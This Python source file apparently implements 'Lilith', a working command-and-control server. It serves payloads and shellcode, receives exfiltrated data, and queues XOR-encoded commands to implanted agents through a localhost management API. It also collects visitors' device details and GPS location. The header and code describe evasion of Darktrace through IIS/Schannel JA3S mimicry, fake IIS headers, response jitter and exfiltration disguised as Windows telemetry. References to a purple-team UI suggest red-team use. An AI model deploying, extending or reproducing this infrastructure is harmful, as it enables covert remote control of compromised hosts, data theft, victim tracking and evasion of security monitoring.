"""
Lilith — HTTPS Payload Server + Callback Listener + C2 Management API

Stealth hardening vs Darktrace:
  - IIS/Schannel cipher suite order → JA3S fingerprint matches Windows Server
  - OP_NO_TICKET: disable TLS session tickets (Schannel doesn't advertise them)
  - Microsoft-IIS/10.0 + ASP.NET response headers on every response
  - Basename-only file lookup: any CDN-like path resolves to workspace file
  - POST callback: any path ending in /{token} accepted
  - JSON telemetry wrapper decoded transparently
  - 50–200 ms per-response jitter breaks timing analysis

C2 agent protocol (localhost management API on separate plain-HTTP port):
  - POST {cb_prefix}/c2/register       ← agent registers, gets XOR key
  - GET  {cb_prefix}/{sid}/task        ← agent polls for pending command
  - POST {cb_prefix}/{sid}/{task_id}   ← agent posts command output
  - GET  /mgmt/sessions                ← list active C2 sessions (mgmt API)
  - POST /mgmt/{sid}/task              ← push command to session (mgmt API)
  - GET  /mgmt/{sid}/result/{tid}      ← poll for result (mgmt API)
"""

import ssl
import http.server
import os
import json
import base64
import random
import time
import secrets
import threading
import collections
import hashlib
import socketserver
from datetime import datetime, timedelta

from server.certs import ensure_certs
from server.ui import handle_ui_request as _handle_ui

# ── IIS/Schannel TLS cipher preference ──────────────────────────────────────
_IIS_CIPHERS = (
    "ECDHE-RSA-AES256-GCM-SHA384:"
    "ECDHE-RSA-AES128-GCM-SHA256:"
    "ECDHE-RSA-AES256-SHA384:"
    "ECDHE-RSA-AES128-SHA256:"
    "AES256-GCM-SHA384:"
    "AES128-GCM-SHA256:"
    "AES256-SHA256:"
    "AES128-SHA256"
)

_IIS_HEADERS = {
    "Server":                 "Microsoft-IIS/10.0",
    "X-Powered-By":           "ASP.NET",
    "X-AspNet-Version":       "4.0.30319",
    "X-Content-Type-Options": "nosniff",
    "Cache-Control":          "no-store, no-cache, must-revalidate",
    "Pragma":                 "no-cache",
    "Vary":                   "Accept-Encoding",
}

_MIME = {
    ".dat":  "application/octet-stream",
    ".enc":  "application/octet-stream",
    ".exe":  "application/octet-stream",
    ".ps1":  "text/plain; charset=utf-8",
    ".xml":  "application/xml",
    ".json": "application/json",
    ".msi":  "application/x-msi",
    ".html": "text/html; charset=utf-8",
    ".js":   "application/javascript",
    ".apk":  "application/vnd.android.package-archive",
    ".sh":   "text/plain; charset=utf-8",
    ".elf":  "application/octet-stream",
}

_EXFIL_LOG: list[tuple[str, str, str]] = []

# ── Engagement DB (optional — set by cmd_serve) ──────────────────────────────
_ENGAGE_DB = None   # type: core.engage.EngagementDB | None

def set_engage_db(db) -> None:
    global _ENGAGE_DB
    _ENGAGE_DB = db

# ── C2 session registry ──────────────────────────────────────────────────────
_C2_SESSIONS: dict = {}
_C2_LOCK = threading.Lock()


def _c2_new_session(session_id: str, host: str) -> int:
    key = (secrets.randbits(7) | 1) & 0xFF   # odd, 1-127
    with _C2_LOCK:
        _C2_SESSIONS[session_id] = {
            "host":      host,
            "key":       key,
            "tasks":     collections.deque(),
            "results":   {},
            "last_seen": datetime.now(),
        }
    return key


def _c2_push_task(session_id: str, command: str) -> str | None:
    with _C2_LOCK:
        sess = _C2_SESSIONS.get(session_id)
        if not sess:
            return None
        task_id = secrets.token_hex(8)   # 16-char hex
        sess["tasks"].append((task_id, command))
    return task_id


def _c2_pop_task(session_id: str) -> tuple[str, str] | None:
    with _C2_LOCK:
        sess = _C2_SESSIONS.get(session_id)
        if not sess or not sess["tasks"]:
            return None
        sess["last_seen"] = datetime.now()
        return sess["tasks"].popleft()


def _c2_store_result(session_id: str, task_id: str, output: str) -> None:
    with _C2_LOCK:
        sess = _C2_SESSIONS.get(session_id)
        if sess:
            sess["results"][task_id] = (datetime.now(), output)
            sess["last_seen"] = datetime.now()


def _c2_get_result(session_id: str, task_id: str) -> str | None:
    """Return and consume the result for task_id (one-shot fetch)."""
    with _C2_LOCK:
        sess = _C2_SESSIONS.get(session_id)
        if not sess:
            return None
        entry = sess["results"].pop(task_id, None)
        return entry[1] if entry else None


def _c2_encode_task(task_id: str, command: str, key: int) -> bytes:
    """XOR(task_id[16] || '|' || command) with the established session key.
    Key is NOT prepended to the wire payload — the agent uses the key from
    its registration response, so an observer cannot recover the key from
    the task packet alone."""
    payload = (task_id + "|" + command).encode("utf-8")
    return bytes([b ^ key for b in payload])


_SESSION_STALE_S = 90   # seconds since last_seen before a session is considered dead

def _c2_kill_session(session_id: str) -> bool:
    with _C2_LOCK:
        if session_id in _C2_SESSIONS:
            del _C2_SESSIONS[session_id]
            return True
    return False


def get_c2_sessions() -> dict:
    now = datetime.now()
    with _C2_LOCK:
        return {
            sid: {
                "host":      s["host"],
                "key":       s["key"],
                "pending":   len(s["tasks"]),
                "results":   len(s["results"]),
                "last_seen": s["last_seen"].strftime("%H:%M:%S"),
                "stale":     (now - s["last_seen"]).total_seconds() > _SESSION_STALE_S,
            }
            for sid, s in _C2_SESSIONS.items()
        }


# ── HTTPS handler ────────────────────────────────────────────────────────────

class _Handler(http.server.BaseHTTPRequestHandler):
    workspace: str = ""
    callback_prefix: str = "/api/diagnostics"

    def do_GET(self):
        raw_path = self.path.split("?")[0]
        parts = [p for p in raw_path.strip("/").split("/") if p]

        # C2 task poll: GET {callback_prefix}/{session_id}/task
        if raw_path.startswith(self.callback_prefix) and raw_path.endswith("/task"):
            session_id = parts[-2] if len(parts) >= 2 else ""
            self._handle_c2_poll(session_id)
            return

        # C2 agent SC fetch (used by migrate command in agent)
        if raw_path.startswith(self.callback_prefix) and raw_path.endswith("/c2/agent-sc"):
            self._handle_agent_sc()
            return

        # Purple team web UI
        if raw_path.startswith("/ui"):
            db = _ENGAGE_DB
            if db is None:
                body = b'{"error":"db not initialized"}'
                self.send_response(503)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return
            status, ct, resp = _handle_ui("GET", self.path, b"", db)
            self.send_response(status)
            self.send_header("Content-Type", ct)
            self.send_header("Content-Length", str(len(resp)))
            self.end_headers()
            self.wfile.write(resp)
            return

        # File serve: any CDN-like path resolves to workspace basename
        basename = os.path.basename(raw_path)
        full = os.path.join(self.workspace, basename)
        if not basename or not os.path.isfile(full):
            self._send_iis_404()
            return

        time.sleep(random.uniform(0.05, 0.20))

        with open(full, "rb") as f:
            data = f.read()

        ext  = os.path.splitext(basename)[1].lower()
        mime = _MIME.get(ext, "application/octet-stream")

        self.send_response(200)
        self._add_iis_headers()
        self.send_header("Content-Type",   mime)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Last-Modified",  "Tue, 15 Jan 2025 08:00:00 GMT")
        self.send_header("ETag",           f'"{len(data):x}-{hashlib.md5(data).hexdigest()[:8]}"')
        self.end_headers()
        self.wfile.write(data)

        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] GET  {raw_path} → {self.client_address[0]}  ({len(data):,}B)")
        if _ENGAGE_DB:
            _ENGAGE_DB.log_event("file_served",
                                 f"{basename} → {self.client_address[0]}",
                                 extra={"path": raw_path, "size": len(data), "client": self.client_address[0]})

    def do_POST(self):
        raw_path = self.path.rstrip("/")
        parts = [p for p in raw_path.strip("/").split("/") if p]

        length = int(self.headers.get("Content-Length", 0))
        body_raw = self.rfile.read(length) if length else b""

        # NFC recon collection: POST /collect
        if raw_path == "/collect":
            self._handle_nfc_collect(body_raw)
            return

        # Purple team web UI (POST — label endpoint)
        if raw_path.startswith("/ui"):
            db = _ENGAGE_DB
            if db is None:
                body = b'{"error":"db not initialized"}'
                self.send_response(503)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return
            status, ct, resp = _handle_ui("POST", raw_path, body_raw, db)
            self.send_response(status)
            self.send_header("Content-Type", ct)
            self.send_header("Content-Length", str(len(resp)))
            self.end_headers()
            self.wfile.write(resp)
            return

        # C2 agent registration: POST .../c2/register
        if raw_path.endswith("/c2/register"):
            self._handle_c2_register(body_raw)
            return

        # C2 result or regular callback — distinguish by session_id match
        token      = parts[-1] if parts else ""
        session_id = parts[-2] if len(parts) >= 2 else ""

        with _C2_LOCK:
            is_c2_result = session_id in _C2_SESSIONS

        if is_c2_result:
            self._handle_c2_result(session_id, token, body_raw)
        else:
            self._handle_callback(token, body_raw)

    # ── C2 handlers ───────────────────────────────────────────────────────────

    def _handle_agent_sc(self):
        """Serve the C2 agent shellcode (.enc) for in-agent migration."""
        sc_path = _find_agent_sc(self.workspace)
        if not sc_path:
            self._send_iis_404()
            ts = datetime.now().strftime("%H:%M:%S")
            print(f"[{ts}] [!] agent-sc requested but not found in workspace — run: lilith build --runner")
            return
        with open(sc_path, "rb") as f:
            data = f.read()
        time.sleep(random.uniform(0.05, 0.15))
        self.send_response(200)
        self._add_iis_headers()
        self.send_header("Content-Type",   "application/octet-stream")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] AGENT-SC  src={self.client_address[0]}  ({len(data):,}B)  [migration request]")

    def _handle_c2_register(self, body: bytes):
        try:
            data = json.loads(body)
            session_id = data.get("machineId", secrets.token_hex(8))
        except Exception:
            session_id = secrets.token_hex(8)

        key = _c2_new_session(session_id, self.client_address[0])
        resp = json.dumps({"key": key}).encode()
        time.sleep(random.uniform(0.05, 0.15))
        self.send_response(200)
        self._add_iis_headers()
        self.send_header("Content-Type",   "application/json")
        self.send_header("Content-Length", str(len(resp)))
        self.end_headers()
        self.wfile.write(resp)

        ts = datetime.now().strftime("%H:%M:%S")
        print(f"\n[{ts}] C2 REGISTER  session={session_id}  src={self.client_address[0]}  key=0x{key:02X}\n")
        if _ENGAGE_DB:
            _ENGAGE_DB.log_session(session_id, self.client_address[0])
            _ENGAGE_DB.log_event("register", f"src={self.client_address[0]}", session_id=session_id)

    def _handle_c2_poll(self, session_id: str):
        time.sleep(random.uniform(0.05, 0.15))
        # Update last_seen on every poll so --list accurately shows agent liveness
        with _C2_LOCK:
            sess = _C2_SESSIONS.get(session_id)
            if sess:
                sess["last_seen"] = datetime.now()
        task = _c2_pop_task(session_id)
        if task is None:
            self.send_response(200)
            self._add_iis_headers()
            self.send_header("Content-Length", "0")
            self.end_headers()
            return

        task_id, command = task
        with _C2_LOCK:
            key = _C2_SESSIONS[session_id]["key"]

        encoded = _c2_encode_task(task_id, command, key)
        self.send_response(200)
        self._add_iis_headers()
        self.send_header("Content-Type",   "application/octet-stream")
        self.send_header("Content-Length", str(len(encoded)))
        self.end_headers()
        self.wfile.write(encoded)

        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[{ts}] C2 TASK  session={session_id}  task={task_id}  cmd={command!r}")
        if _ENGAGE_DB:
            _ENGAGE_DB.log_task(task_id, session_id, command)
            _ENGAGE_DB.touch_session(session_id)

    def _handle_c2_result(self, session_id: str, task_id: str, body: bytes):
        output = _decode_exfil(body)
        _c2_store_result(session_id, task_id, output)

        resp = b'{"status":"ok","code":0}'
        time.sleep(random.uniform(0.05, 0.15))
        self.send_response(200)
        self._add_iis_headers()
        self.send_header("Content-Type",   "application/json")
        self.send_header("Content-Length", str(len(resp)))
        self.end_headers()
        self.wfile.write(resp)

        ts = datetime.now().strftime("%H:%M:%S")
        print(f"\n{'─'*60}")
        print(f"[{ts}] C2 RESULT  session={session_id}  task={task_id}")
        print(f"{'─'*60}")
        print(output.rstrip() if output.strip() else "[no output]")
        print(f"{'─'*60}\n")
        if _ENGAGE_DB:
            is_bin = output.startswith("_BIN_B64:\n")
            _ENGAGE_DB.log_result(task_id, session_id, output, is_binary=is_bin)
            _ENGAGE_DB.touch_session(session_id)

    def _handle_callback(self, token: str, body: bytes):
        output = _decode_exfil(body)

        resp = b'{"status":"ok","code":0}'
        self.send_response(200)
        self._add_iis_headers()
        self.send_header("Content-Type",   "application/json")
        self.send_header("Content-Length", str(len(resp)))
        self.end_headers()
        self.wfile.write(resp)

        ts = datetime.now().strftime("%H:%M:%S")
        _EXFIL_LOG.append((ts, token, output))
        print(f"\n{'─'*60}")
        print(f"[{ts}] CALLBACK  token={token}  src={self.client_address[0]}")
        print(f"{'─'*60}")
        print(output.rstrip())
        print(f"{'─'*60}\n")
        if _ENGAGE_DB:
            _ENGAGE_DB.log_event("callback",
                                 f"token={token} src={self.client_address[0]}",
                                 extra={"output_preview": output[:500]})

    def _handle_nfc_collect(self, body: bytes):
        resp = b'{"ok":1}'
        self.send_response(200)
        self._add_iis_headers()
        self.send_header("Content-Type",                "application/json")
        self.send_header("Content-Length",              str(len(resp)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(resp)
        try:
            data = json.loads(body)
        except Exception:
            return
        src   = self.client_address[0]
        ts    = datetime.now().strftime("%H:%M:%S")
        phase = data.get("phase", "?")
        tag   = "NFC-PASSIVE" if phase == "passive" else "NFC-RECON  "
        print(f"\n{'─'*62}")
        print(f"[{ts}] {tag}  src={src}  phase={phase}")
        print(f"{'─'*62}")
        for key, lbl in [("ua","User-Agent"),("platform","Platform  "),
                          ("lang","Language  "),("tz","Timezone  "),
                          ("net_type","Network   "),("cores","CPU cores "),
                          ("mem","Memory    "),("touch","Touch pts "),
                          ("bat","Battery   "),("lat","GPS Lat   "),
                          ("lon","GPS Lon   "),("acc","GPS Acc   ")]:
            v = data.get(key)
            if v is None:
                continue
            if key == "bat":   v = f"{v}%  charging={data.get('bat_chg')}"
            elif key in ("lat","lon"): v = f"{float(v):.6f}"
            elif key == "acc": v = f"{float(v):.1f} m"
            elif key == "mem": v = f"{v} GB"
            print(f"  {lbl} : {v}")
        sw, sh = data.get("sw"), data.get("sh")
        if sw and sh:
            print(f"  Screen    : {sw}x{sh}  dpr={data.get('dpr',1)}")
        lat, lon = data.get("lat"), data.get("lon")
        if lat is not None and lon is not None:
            print(f"  Maps      : https://maps.google.com/?q={lat},{lon}")
        print(f"{'─'*62}\n")
        if _ENGAGE_DB:
            ua  = (data.get("ua") or "")[:80]
            loc = f"  gps={lat:.5f},{lon:.5f}" if lat is not None else ""
            _ENGAGE_DB.log_event("nfc_recon",
                                 f"src={src}  phase={phase}  ua={ua}{loc}",
                                 extra=data)

    # ── helpers ───────────────────────────────────────────────────────────────

    def _add_iis_headers(self):
        for k, v in _IIS_HEADERS.items():
            self.send_header(k, v)

    def _send_iis_404(self):
        body = b"<!DOCTYPE html><html><head><title>404 - Not Found</title></head><body><h2>404 - File or directory not found.</h2></body></html>"
        self.send_response(404)
        self._add_iis_headers()
        self.send_header("Content-Type",   "text/html; charset=UTF-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        pass


# ── Management API (plain HTTP, localhost only) ──────────────────────────────

class _MgmtHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        if self.client_address[0] not in ("127.0.0.1", "::1"):
            self.send_error(403); return

        path = self.path.split("?")[0].rstrip("/")
        parts = [p for p in path.strip("/").split("/") if p]

        # GET /mgmt/sessions
        if parts == ["mgmt", "sessions"]:
            body = json.dumps(get_c2_sessions(), indent=2).encode()
            self._json(body); return

        # GET /mgmt/{sid}/result/{tid}
        if len(parts) == 4 and parts[0] == "mgmt" and parts[2] == "result":
            sid, tid = parts[1], parts[3]
            result = _c2_get_result(sid, tid)
            if result is None:
                self.send_response(204); self.end_headers(); return
            self._json(json.dumps({"output": result}).encode()); return

        self.send_error(404)

    def do_DELETE(self):
        if self.client_address[0] not in ("127.0.0.1", "::1"):
            self.send_error(403); return

        path = self.path.split("?")[0].rstrip("/")
        parts = [p for p in path.strip("/").split("/") if p]

        # DELETE /mgmt/{sid}  — kill (forget) a session
        if len(parts) == 2 and parts[0] == "mgmt":
            sid = parts[1]
            ok = _c2_kill_session(sid)
            if not ok:
                self.send_error(404); return
            self._json(json.dumps({"status": "killed", "session": sid}).encode()); return

        self.send_error(404)

    def do_POST(self):
        if self.client_address[0] not in ("127.0.0.1", "::1"):
            self.send_error(403); return

        path = self.path.split("?")[0].rstrip("/")
        parts = [p for p in path.strip("/").split("/") if p]
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""

        # POST /mgmt/{sid}/task  body={"cmd":"..."}
        if len(parts) == 3 and parts[0] == "mgmt" and parts[2] == "task":
            sid = parts[1]
            try:
                cmd = json.loads(body).get("cmd", "")
            except Exception:
                self.send_error(400); return
            tid = _c2_push_task(sid, cmd)
            if tid is None:
                self.send_error(404); return
            self._json(json.dumps({"task_id": tid}).encode()); return

        self.send_error(404)

    def _json(self, body: bytes):
        self.send_response(200)
        self.send_header("Content-Type",   "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        pass


# ── Helpers ──────────────────────────────────────────────────────────────────

def _find_agent_sc(workspace_dir: str) -> str | None:
    """Return the path to the C2 agent shellcode .enc file, or None if not built."""
    manifest = os.path.join(workspace_dir, "manifest.json")
    if not os.path.exists(manifest):
        return None
    try:
        with open(manifest) as f:
            m = json.load(f)
    except Exception:
        return None
    sc_name = m.get("enc___runner_sc_c2__")
    if not sc_name:
        return None
    p = os.path.join(workspace_dir, sc_name)
    return p if os.path.exists(p) else None


def _decode_exfil(body: bytes) -> str:
    """
    Task 9 — Malleable C2: decode telemetry regardless of field name aliases.
    The agent rotates between multiple JSON schemas (DiagTrack, WER, AppInsights)
    so TLS-inspection fingerprinting cannot key on a fixed schema.
    We accept any of the known field name sets here.
    """
    try:
        data = json.loads(body)
        # Primary schema: {"events":[{"type":...,"data":"<b64>"}]}
        events = data.get("events", [])
        if events:
            entry = events[0]
            # Accept multiple field aliases for the payload field
            raw = entry.get("data") or entry.get("payload") or entry.get("value") or ""
            if raw:
                return base64.b64decode(raw).decode("utf-8", errors="replace")
            return ""   # valid JSON but empty data — don't echo raw JSON
        # Alternate schema: {"log":[{"msg":"<b64>"}]}
        for alt_key in ("log", "records", "entries"):
            alt = data.get(alt_key, [])
            if alt:
                raw = alt[0].get("msg") or alt[0].get("body") or ""
                if raw:
                    return base64.b64decode(raw).decode("utf-8", errors="replace")
        return body.decode("utf-8", errors="replace")
    except Exception:
        return body.decode("utf-8", errors="replace")


def start_server(
    workspace:       str,
    lhost:           str = "0.0.0.0",
    port:            int = 8443,
    mgmt_port:       int = 8444,
    cert:            str = None,
    key:             str = None,
    callback_prefix: str = "/api/diagnostics",
):
    if cert is None or key is None:
        cert, key = ensure_certs(workspace, lhost)
    if not cert:
        print("[!] TLS cert generation failed — cannot start server")
        return

    _Handler.workspace       = workspace
    _Handler.callback_prefix = callback_prefix

    class _ThreadedHTTPS(socketserver.ThreadingMixIn, http.server.HTTPServer):
        daemon_threads = True
        allow_reuse_address = True

    class _ThreadedHTTP(socketserver.ThreadingMixIn, http.server.HTTPServer):
        daemon_threads = True
        allow_reuse_address = True

    httpd = _ThreadedHTTPS((lhost, port), _Handler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    ctx.set_ciphers(_IIS_CIPHERS)
    ctx.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | getattr(ssl, "OP_NO_TICKET", 0)
    ctx.load_cert_chain(certfile=cert, keyfile=key)
    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)

    # Background cleanup: reap dead sessions and orphaned results
    def _cleanup_loop():
        while True:
            time.sleep(60)
            cutoff_session = datetime.now() - timedelta(seconds=600)
            cutoff_result  = datetime.now() - timedelta(seconds=300)
            with _C2_LOCK:
                dead = [sid for sid, s in _C2_SESSIONS.items()
                        if s["last_seen"] < cutoff_session]
                for sid in dead:
                    del _C2_SESSIONS[sid]
                for sid, s in _C2_SESSIONS.items():
                    stale_tasks = [tid for tid, (ts, _) in s["results"].items()
                                   if ts < cutoff_result]
                    for tid in stale_tasks:
                        del s["results"][tid]

    threading.Thread(target=_cleanup_loop, daemon=True).start()

    # Management API on loopback (plain HTTP, no TLS — localhost only)
    mgmt = _ThreadedHTTP(("127.0.0.1", mgmt_port), _MgmtHandler)
    mgmt_thread = threading.Thread(target=mgmt.serve_forever, daemon=True)
    mgmt_thread.start()

    print(f"[+] HTTPS server  {lhost}:{port}")
    print(f"    Workspace : {workspace}")
    print(f"    Cert      : {cert}")
    print(f"    Callbacks : POST {callback_prefix}/.../<token>")
    print(f"    C2 poll   : GET  {callback_prefix}/<session>/task")
    print(f"    C2 reg    : POST {callback_prefix}/c2/register")
    print(f"    Mgmt API  : http://127.0.0.1:{mgmt_port}/mgmt/...")
    print(f"    Headers   : Server: Microsoft-IIS/10.0")
    print(f"    Ciphers   : IIS/Schannel order (JA3S mimicry)")
    print(f"    UI        : https://{lhost}:{port}/ui/")
    print(f"    Ctrl+C to stop\n")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
        mgmt.shutdown()
